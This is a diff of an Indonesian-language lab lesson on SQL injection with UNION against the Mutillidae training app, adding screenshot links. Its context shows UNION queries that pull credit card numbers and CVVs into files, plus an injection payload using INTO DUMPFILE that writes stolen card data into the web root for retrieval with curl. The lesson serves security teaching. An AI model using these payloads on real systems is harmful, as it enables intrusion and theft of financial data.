@@ -1,4 +1,4 @@
-ex## Lesson 9 - SQL Injection Union Exploit \#2
+## Lesson 9 - SQL Injection Union Exploit \#2
 
 ### \# Penjelasan Database Union
 
@@ -11,6 +11,7 @@ use owasp10;
 show tables;
 ```
 didalam database terdapat tabel _accounts_ dan _credit_cards_. 2 tabel tersebut akan kita union kan. **UNION** adalah operasi penggabungan lebih dari satu hasil **SELECT** dalam SQL
+![](/assets/lesson-9/database_union_1.JPG)
 
 * **Step 2** : Melakukan operasi UNION
 
@@ -18,11 +19,14 @@ Operasi UNION menampilkan di terminal
 ```
 select * from accounts where username RLIKE '^[0-9]' union select ccid, ccnumber, ccv, expiration, null from credit_cards;
 ```
+![](/assets/lesson-9/database_union_2.JPG)
+
 Operasi UNION mencetak di file yang berlokasi di **'/tmp/CCN.csv'**
 ```
 select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/tmp/CCN.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED by '\n';
 \! cat /tmp/CCN.csv
 ```
+![](/assets/lesson-9/database_union_3.JPG)
 
 ### \# SQL Injection
 
@@ -40,8 +44,12 @@ AppArmor dalam OS turunan Ubuntu berfungsi untuk membatasi resource dari aktivit
 ' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO DUMPFILE '/var/www/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' -- 
 ```
 Dan jangan lupa untuk menambahkan 1 spasi diakhir, `"-- "`. Operasi ini adalah tidak akan menampilkan hasil, justru Authentication Error. Namun disisi lain akan membuat file **CCN2.txt**
+![](/assets/lesson-9/injection_result.JPG)
+
 
 * **Step 5** : Melihat hasil operasi dengan web browser `http://10.151.36.64/mutillidae/CCN2.txt` 
+![](/assets/lesson-9/union_curl_2.JPG)
+
 
 * **Step 6** : Melihat hasil operasi dengan web browser `curl --location 10.151.36.64/mutillidae/CCN2.txt`
-
+![](/assets/lesson-9/union_curl_3.JPG)
